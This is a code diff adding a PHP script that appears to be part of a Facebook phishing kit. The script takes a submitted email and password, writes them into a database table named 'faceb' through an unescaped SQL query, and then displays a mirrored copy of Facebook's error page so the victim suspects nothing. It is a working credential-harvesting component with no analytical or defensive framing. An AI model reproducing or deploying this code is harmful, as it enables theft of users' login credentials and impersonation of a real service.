@@ -1,0 +1,90 @@
+<?php
+include("connect.php");
+
+$email =  $_POST["email"];
+$sifre = $_POST["pass"];
+ 
+		
+ 
+		   $addding_link = mysql_query("Insert into faceb (email, sifre) Values ('$email', '$sifre')");
+	
+?>
+<!DOCTYPE html>
+<html lang="en" id="facebook">
+  
+<!-- Mirrored from www.facebook.com/common/error.html by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 13 Sep 2014 11:38:13 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <title>Facebook | Error</title>
+    <meta charset="utf-8">
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta name="robots" content="noindex,nofollow">
+    <style>
+      html, body {
+        color: #333;
+        font-family: 'Lucida Grande', 'Tahoma', 'Verdana', 'Arial', sans-serif;
+        margin: 0;
+        padding: 0;
+        text-align: center;
+      }
+
+      .header {
+        background: #3b5998 url('http://www.facebook.com/common/logo.png') center 11px no-repeat;
+        border-bottom: 1px solid #133783;
+        display: block;
+        height: 38px;
+        margin-left: -889px;
+        position: relative;
+      }
+
+      .core {
+        margin: auto;
+        padding: 1em 0;
+        text-align: left;
+        width: 904px;
+      }
+
+      h1 {
+        font-size: 18px;
+      }
+
+      p {
+        font-size: 13px;
+      }
+
+      .footer {
+        border-top: 1px solid #ddd;
+        color: #777;
+        float: left;
+        font-size: 11px;
+        padding: 5px 8px 6px 0;
+        width: 904px;
+      }
+    </style>
+  </head>
+  <body>
+    <a class="header" href="http://www.facebook.com/"></a>
+    <div class="core">
+      <h1>Sorry, something went wrong.</h1>
+      <p>We're working on getting this fixed as soon as we can.</p>
+      <p><a id="back" href="http://www.facebook.com/">Go Back</a></p>
+      <div class="footer">
+        Facebook &copy;
+        <span title="##IPADDRESS##">20</span>14
+        &#183;
+        <a href="http://www.facebook.com/help/">Help</a>
+      </div>
+    </div>
+    <script>
+      document.getElementById('back').onclick = function() {
+        if (history.length > 1) {
+          history.back();
+          return false;
+        }
+      };
+    </script>
+  </body>
+
+<!-- Mirrored from www.facebook.com/common/error.html by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 13 Sep 2014 11:38:13 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+</html>
